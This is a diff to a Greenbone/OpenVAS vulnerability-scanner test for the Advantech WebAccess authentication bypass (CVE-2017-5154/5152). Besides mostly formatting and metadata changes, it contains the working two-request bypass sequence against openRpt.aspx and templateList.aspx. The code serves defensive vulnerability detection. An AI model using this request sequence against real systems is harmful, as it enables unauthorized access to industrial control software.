@@ -34,7 +34,7 @@ if (description)
   script_cve_id("CVE-2017-5154", "CVE-2017-5152");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_version("$Revision: 12387 $");
+  script_version("2019-04-06T12:52:40+0000");
 
   script_name("Advantech WebAccess 'updateTemplate.aspx' SQL Injection and Authentication Bypass Vulnerabilities");
 
@@ -58,14 +58,14 @@ if (description)
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_active");
 
-  script_tag(name:"last_modification", value:"$Date: 2018-11-16 15:06:23 +0100 (Fri, 16 Nov 2018) $");
+  script_tag(name:"last_modification", value:"2019-04-06 12:52:40 +0000 (Sat, 06 Apr 2019)");
   script_tag(name:"creation_date", value:"2017-01-31 16:34:49 +0100 (Tue, 31 Jan 2017)");
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
   script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
-  script_dependencies("gb_advantech_webaccess_detect.nasl");
+  script_dependencies("gb_advantech_webaccess_consolidation.nasl");
+  script_mandatory_keys("advantech/webaccess/detected");
   script_require_ports("Services/www", 80);
-  script_mandatory_keys("Advantech/WebAccess/installed");
 
   exit(0);
 }
@@ -75,29 +75,35 @@ include("http_keepalive.inc");
 include("misc_func.inc");
 include("host_details.inc");
 
-if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
+if( ! port = get_app_port( cpe: CPE, service: "www" ) )
+  exit( 0 );
+
+if( ! get_app_location( cpe: CPE, port: port ) )
+  exit( 0 );
 
 vt_strings = get_vt_strings();
 data = "projName=" + vt_strings["default"] + "&nodeName=" + vt_strings["default"] + "&waPath=C:\\WebAccess\\Node";
 asp_session = "ASP.NET_SessionId=" + crap( data:rand_str( charset:"abcdefghijklmnopqrstuvwxyz", length:1 ), length:24 );
 
-req = http_get_req( port:port, url:"/WaExlViewer/templateList.aspx", add_headers:make_array( "Cookie", asp_session));
-buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
+req = http_get_req( port: port, url: "/WaExlViewer/templateList.aspx", add_headers: make_array( "Cookie", asp_session ) );
+buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
 
-if( "signinonly.asp" >!< buf ) exit( 0 );
+if( "signinonly.asp" >!< buf ) 
+  exit( 0 );
 
-req = http_post_req( port:port, url:"/WaExlViewer/openRpt.aspx", data:data, add_headers:make_array( "Cookie", asp_session,
-                                                                                                    "Content-Type", "application/x-www-form-urlencoded") );
-buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
+req = http_post_req( port: port, url: "/WaExlViewer/openRpt.aspx", data: data, add_headers: make_array( "Cookie", asp_session,
+                                                                                                    "Content-Type", "application/x-www-form-urlencoded" ) );
+buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
 
-if( buf !~ "HTTP/1\.. 200" ) exit( 99 );
+if( buf !~ "HTTP/1\.. 200" ) 
+  exit( 99 );
 
-req1 = http_get_req( port:port, url:"/WaExlViewer/templateList.aspx", add_headers:make_array( "Cookie", asp_session));
-buf = http_keepalive_send_recv( port:port, data:req1, bodyonly:FALSE );
+req1 = http_get_req( port: port, url: "/WaExlViewer/templateList.aspx", add_headers: make_array( "Cookie", asp_session ) );
+buf = http_keepalive_send_recv( port: port, data: req1, bodyonly: FALSE );
 
 if( "Template List" >< buf && "function popupChangeTemplateDiv" >< buf && "templateName" >< buf )
 {
-  security_message( port:port, data:'It was possible to bypass authentication by sending two requests:\n\nRequest1:\n\n' + req + '\n\nRequest2:\n\n' + req1 + '\n\nResult (truncated):\n\n' + substr( buf, 0, 2000 ) + '\n[...]\n\n');
+  security_message( port: port, data: 'It was possible to bypass authentication by sending two requests:\n\nRequest1:\n\n' + req + '\n\nRequest2:\n\n' + req1 + '\n\nResult (truncated):\n\n' + substr( buf, 0, 2000 ) + '\n[...]\n\n' );
   exit( 0 );
 }
 
